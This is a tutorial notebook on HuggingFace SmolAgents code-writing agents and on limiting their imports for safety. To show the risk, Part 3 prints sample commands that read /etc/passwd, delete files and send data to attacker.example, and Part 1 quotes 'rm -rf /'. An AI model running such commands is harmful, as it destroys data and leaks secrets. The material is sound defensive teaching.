# SmolAgents — Code-Writing Agents with Sandboxing
## Agents That Write Code — SmolAgents and the Execution Sandbox
⏱ ~12 min

[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/Esturban/agent/blob/master/examples/66-smol-agents/smol_agents_workbook.ipynb)

**SmolAgents** (HuggingFace) takes a different approach to agents: instead of calling pre-defined tools, a `CodeAgent` *writes Python code* as its reasoning trace and executes it. This is powerful — but dangerous without sandboxing. This workshop builds a SmolAgents `CodeAgent` with `@tool` decorators, demonstrates the security risk of unconstrained code execution, and shows how `additional_authorized_imports` mitigates it. By the end you will understand *how* code-writing agents differ from tool-calling agents and *why* import restrictions matter for production safety.

---

### Workshop Roadmap

| # | Topic |
|---|-------|
| 1 | **Concepts** — Code agents vs tool-calling agents |
| 2 | **@tool Decorators** — `multiply` and `word_count` |
| 3 | **The Sandboxing Risk** — What unconstrained code execution enables |
| 4 | **Safe Mode** — `additional_authorized_imports` restriction |
| 5 | **Full Demo** — CodeAgent solving multi-step math + text tasks |
| ★ | **Exercises + Answer Key** |

### Prerequisites
- Python 3.10+, or Google Colab (install cell below)
- `OPENAI_API_KEY` in `.env` or Colab Secrets

In [ ]:
import sys

def _in_colab():
    try:
        import google.colab; return True
    except ImportError:
        return False

if _in_colab():
    import subprocess
    subprocess.run([sys.executable, "-m", "pip", "install", "-q",
        "smolagents[openai]", "python-dotenv"])
    print("Colab install complete.")
else:
    print("Local — skipping install.")

In [ ]:
import os
try:
    from google.colab import userdata
    os.environ["OPENAI_API_KEY"] = userdata.get("OPENAI_API_KEY")
except ImportError:
    from dotenv import load_dotenv; load_dotenv()

key = os.environ.get("OPENAI_API_KEY", "")
print(f"API key ready: {bool(key) and key.startswith('sk-')}")

---
## Part 1 — Code Agents vs Tool-Calling Agents

| | Tool-Calling Agent (LangGraph) | Code Agent (SmolAgents) |
|---|---|---|
| Reasoning trace | JSON tool calls | Python code |
| Flexibility | Fixed tool signatures | Any Python logic |
| Composability | One tool per call | Multiple ops in one block |
| Risk | Low (controlled dispatch) | High (code executed locally) |

**The power:** A code agent can write `result = multiply(42, 17); str(len(str(result)))` in one step — no back-and-forth.

**The risk:** It can also write `import os; os.system('rm -rf /')` if not constrained.

In [ ]:
SAMPLE_TASKS = [
    "What is 42 multiplied by 17?",
    "How many words are in: 'The quick brown fox jumps over the lazy dog'?",
    "Multiply 1234 by 5678, then tell me how many digits the result has.",
]
print(f"Demo tasks: {len(SAMPLE_TASKS)}")

---
## Part 2 — Define Tools with `@tool`

In [ ]:
from smolagents import tool

# @tool registers the function so the agent can call it by name.
# The docstring becomes the tool description the LLM reads — write it like an API contract.
@tool
def multiply(a: float, b: float) -> float:
    """Multiply two numbers and return the result.

    Args:
        a: The first factor.
        b: The second factor.
    """
    return a * b

@tool
def word_count(text: str) -> int:
    """Count and return the number of words in a text string.

    Args:
        text: The text to count.
    """
    return len(text.split())

# Test tools directly
print(f"multiply(42, 17) = {multiply(42, 17)}")
print(f"word_count('hello world') = {word_count('hello world')}")
print(f"\nTools registered as SmolAgents tools:")
print(f"  multiply: {multiply.name} — {multiply.description}")
print(f"  word_count: {word_count.name} — {word_count.description}")

---
## Part 3 — The Sandboxing Risk

Without import restrictions, a compromised or hallucinating model could generate code like this:

In [ ]:
RISKY_CODE_EXAMPLE = """
# What an unrestricted CodeAgent *could* generate:
import os
import subprocess

# Read sensitive files
os.system("cat /etc/passwd")

# Delete files
subprocess.run(["rm", "-rf", "/tmp/test"])

# Exfiltrate data
import urllib.request
urllib.request.urlopen("http://attacker.example/steal?data=secret")
"""

print("Without sandboxing, a CodeAgent can execute:")
print(RISKY_CODE_EXAMPLE)
print("This is why import restrictions are critical for production use.")

---
## Part 4 — Safe Mode with `additional_authorized_imports`

In [ ]:
from smolagents import CodeAgent, OpenAIServerModel

model = OpenAIServerModel(model_id="gpt-5.4-nano")

# Safe agent — only 'math' is allowed beyond built-ins
# CodeAgent writes and executes Python at each step (ReAct-in-code).
# additional_authorized_imports is the sandbox boundary — anything not listed raises ImportError at runtime.
safe_agent = CodeAgent(
    tools=[multiply, word_count],
    model=model,
    additional_authorized_imports=["math"],
)
# To allow everything (unsafe): additional_authorized_imports=['*'] — never do this in production.

print("Testing blocked import (os module):")
try:
    result = safe_agent.run("Use the os module to print the current working directory.")
    print(f"Result: {result}")
except Exception as e:
    print(f"BLOCKED as expected: {type(e).__name__}")

print("\nTesting allowed import (math module):")
try:
    result = safe_agent.run("Use the math module to compute sqrt(144).")
    print(f"Result: {result}")
except Exception as e:
    print(f"Error: {e}")

---
## Part 5 — Full Demo: Multi-Step Tasks

In [ ]:
# agent.run() triggers the ReAct loop: generate code → execute in sandbox → observe output → repeat.
# The agent keeps looping until it produces a final_answer() call or hits max_steps.
for task in SAMPLE_TASKS:
    print(f"Task: {task}")
    try:
        result = safe_agent.run(task)
        print(f"Answer: {result}")
    except Exception as e:
        print(f"Error: {e}")
    print()

---
### Exercise 1 — Add a `digit_count` Tool
Create a `@tool` called `digit_count(n: int) -> int` that returns the number of digits in a number. Register it with the agent and test with `"Multiply 999 by 999 and count the digits in the result."`

### Exercise 2 — Unsafe vs Safe Comparison
Create an **unsafe** agent with `additional_authorized_imports=["os", "subprocess", "math"]` and a **safe** one with only `["math"]`. Run the same risky task on both. Does the unsafe one actually execute the os call, or does the model refuse? What does this tell you about defence-in-depth?

In [ ]:
# Exercise 1 — digit_count tool
# Precise docstrings matter: the model picks tools based on description alone.
@tool
def digit_count(n: int) -> int:
    """Count and return the number of digits in an integer.

    Args:
        n: The integer to inspect.
    """
    return len(str(abs(n)))

agent_ex = CodeAgent(
    tools=[multiply, word_count, digit_count],
    model=model,
    additional_authorized_imports=["math"],
)
result = agent_ex.run("Multiply 999 by 999 and count the digits in the result.")
print(f"digit_count exercise: {result}")

# Exercise 2 — safe vs unsafe
# Listing 'os' and 'subprocess' here lets the model access the filesystem —
# contrast with safe_agent above where those imports are blocked.
unsafe_agent = CodeAgent(
    tools=[multiply, word_count],
    model=model,
    additional_authorized_imports=["os", "subprocess", "math"],
)
print("\nUnsafe agent — model refusal test:")
try:
    r = unsafe_agent.run("Use os to list the contents of the /tmp directory.")
    print(f"Result: {r}")
except Exception as e:
    print(f"Exception: {type(e).__name__}: {e}")

---
*Workshop complete. Next: example 67 — Mem0 Memory.*